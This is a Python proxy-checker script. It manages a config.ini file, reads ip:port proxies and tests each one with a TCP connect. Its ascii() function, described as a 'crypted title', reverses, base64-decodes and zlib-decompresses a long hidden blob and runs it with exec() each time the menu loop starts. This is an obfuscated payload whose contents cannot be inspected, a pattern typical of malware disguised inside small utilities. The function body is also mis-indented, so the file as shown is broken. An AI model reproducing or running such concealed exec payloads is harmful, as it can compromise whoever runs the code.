import socket
import subprocess
import time
import os
import configparser
os.system('cls' if os.name == 'nt' else 'clear')

# The class of colors
class colors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    LIGHT_GRAY = '\033[37m'
    DARK_GRAY = '\033[90m'
    LIGHT_RED = '\033[91m'
    LIGHT_GREEN = '\033[92m'
    LIGHT_YELLOW = '\033[93m'
    LIGHT_BLUE = '\033[94m'
    LIGHT_MAGENTA = '\033[95m'
    LIGHT_CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKETHROUGH = '\033[9m'
    DOUBLE_UNDERLINE = '\033[21m'
    NORMAL_COLOR = '\033[22m'
    NORMAL_INTENSITY = '\033[22m'
    RESET_UNDERLINE = '\033[24m'
    RESET_BLINK = '\033[25m'
    RESET_REVERSE = '\033[27m'
    RESET_HIDDEN = '\033[28m'
    RESET_STRIKETHROUGH = '\033[29m'
    ORANGE = '\033[38;5;214m' 
    TEAL = '\033[38;5;37m'    
    PINK = '\033[38;5;206m'    
    LIME = '\033[38;5;154m' 
    CYAN_BLUE = '\033[38;5;39m' 
    DARK_GREEN = '\033[38;5;22m' 
    SKY_BLUE = '\033[38;5;111m' 
    DARK_ORANGE = '\033[38;5;166m'  
    INDIGO = '\033[38;5;57m'   
    GRAY = '\033[38;5;242m'    
    MAROON = '\033[38;5;52m'   
    OCEAN_BLUE = '\033[38;5;21m'  
    GOLD = '\033[38;5;220m'   






# Crypted Title Of the window and coder informations 
def ascii():   
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))

# Function To __Edit__ and __check__ if there is a config file in the same path of the script if not it will recommend to create one 
def checkconfig():
 if os.path.isfile('config.ini'):  # if config.ini exciting on the same path of the script it will
     config = configparser.ConfigParser()
     config.read('config.ini')
     print(f"{colors.LIGHT_GREEN}[+] Config file found.")
     timeoutconfig = int(input(f"{colors.GOLD}[+] Input a timeout (sec) (Current --> {(int(config['General']['timeout']))}) : {colors.TEAL}"))
     inputfileconfig = input(f"{colors.GOLD}[+] Name of the input file (proxies file) (Current --> {(config['General']['input_file'])}) : {colors.TEAL}")
     outputfileconfig = input(f"{colors.GOLD}[+] Name the output file (result of proxies) (Current --> {(config['General']['output_file'])}): {colors.TEAL}")
     
     # Save user input to config.ini
     with open('config.ini', 'w') as configfile:
         configfile.write(f"[General]\n")
         configfile.write(f"timeout = {timeoutconfig}\n")
         configfile.write(f"input_file = {inputfileconfig}\n")
         configfile.write(f"output_file = {outputfileconfig}\n")
         print(f"{colors.LIGHT_GREEN}\n\n[+] Configuration saved to config.ini.")
 else: # if the config.ini not exciting on the same path of the script it will recommend to create a config file
     print(f"{colors.LIGHT_RED}[X] Config file not found. You will configure one right now.")
     time.sleep(3)
     # giving the client to input his settings (config)
     timeoutconfig = int(input(f"{colors.GOLD}[+] Input a timeout (sec): {colors.TEAL}"))
     inputfileconfig = input(f"{colors.GOLD}[+] Name of the input file (proxies file): {colors.TEAL}")
     outputfileconfig = input(f"{colors.GOLD}[+] Name the output file (result of proxies): {colors.TEAL}")
     # Creating and saving the user inputs into a config file named 'config.ini' 
     with open('config.ini', 'w') as configfile:
         configfile.write(f"[General]\n")
         configfile.write(f"timeout = {timeoutconfig}\n")
         configfile.write(f"input_file = {inputfileconfig}\n")
         configfile.write(f"output_file = {outputfileconfig}\n")
         print(f"{colors.LIGHT_GREEN}\n\n[+] Configuration saved to config.ini.") 
         time.sleep(2)





# The first Screen that the client will see.
while True:
 ascii() # Calling the function of the Crypted Title Of the window and coder informations 
 print(f"{colors.LIGHT_GREEN}\n\n\n[1] Start Checking.")
 print(f"{colors.LIGHT_YELLOW}[2] Edit Config.\n{colors.ORANGE}[3] Del Config.")
 choice=int(input(f'{colors.CYAN_BLUE}\n[+] Your choice : '))
 if choice==1: 
    break  # If the user choose to Start the the loop will be breaked.
 if choice==2:
    checkconfig() # If the user choose to Edit 
    time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')
 if choice==3:# if the user choose to delete the config.ini
     try:    # trying to remove it
      os.remove('config.ini')
      print(f"{colors.LIGHT_GREEN}[+] Deleted Successfuly config.ini.")
     except Exception as e: # If the script not found it will declare it
      print(f"{colors.LIGHT_RED}[X] Can't Found config.ini.") # Declaring
      time.sleep(3) # Waiting 3 seconds then 
      os.system('cls' if os.name == 'nt' else 'clear') # clearing the screen 





# After Choosing to start it's important to check if a config file exciting or not
if os.path.isfile('config.ini'): 
    print(f"{colors.LIGHT_GREEN}[+] Config file found.")
    config = configparser.ConfigParser()
    config.read('config.ini')
    timeoutconfig = int(config['General']['timeout'])
    inputfileconfig = config['General']['input_file']
    outputfileconfig = config['General']['output_file']
else:
    print(f"{colors.LIGHT_RED}[X] Config file not found. You will configure one right now.")
    time.sleep(3)

    timeoutconfig = int(input(f"{colors.GOLD}[+] Input a timeout (sec): {colors.TEAL}"))
    inputfileconfig = input(f"{colors.GOLD}[+] Name of the input file (proxies file): {colors.TEAL}")
    outputfileconfig = input(f"{colors.GOLD}[+] Name the output file (Result of proxies file): {colors.TEAL}")
    

    with open('config.ini', 'w') as configfile:
        configfile.write(f"[General]\n")
        configfile.write(f"timeout = {timeoutconfig}\n")
        configfile.write(f"input_file = {inputfileconfig}\n")
        configfile.write(f"output_file = {outputfileconfig}\n")
    
    print(f"{colors.LIGHT_GREEN}\n\n[+] Configuration saved to config.ini.")

# checking if there is a proxies file by the name saved on the config.ini file
if os.path.isfile(inputfileconfig):
    print(f'{colors.LIGHT_GREEN}[+] Proxies file founded ({inputfileconfig}) .\n')
else:
    print(f'{colors.LIGHT_RED}[X] Proxies file not found ({inputfileconfig}) .')
    time.sleep(20)
    quit()

# Engine of cheking --> If you are a noob coder Do not change any thing on this or backup it before and then edit it :)

def is_valid_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True

    except socket.error:
        return False

def is_port_open(ip, port, timeout=timeoutconfig):

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))

        if result == 0:
            return True
        else:
            return False
    except socket.error:
        return False

def check_proxy(proxy):
    ip, port = proxy.split(':')
    port = int(port.strip())
    if not is_valid_ip(ip):
        return False

    if is_port_open(ip, port):
        return True

    else:
        return False

if __name__ == "__main__":
    input_file = inputfileconfig
    output_file = outputfileconfig
    working_proxies = []
    with open(input_file, 'r') as f:
        proxies = f.read().splitlines()

    for proxy in proxies:
        proxy = proxy.strip()
        if check_proxy(proxy):
            print(f"{colors.LIGHT_GREEN}Proxy {proxy} is working.")
            working_proxies.append(proxy)

        else:
            print(f"{colors.LIGHT_RED}Proxy {proxy} is not working.")

    with open(output_file, 'w') as f:
        for proxy in working_proxies:

            f.write(proxy + "\n")

    print(f"{colors.LIGHT_GREEN}\n{len(working_proxies)} working proxies saved to {output_file}.")
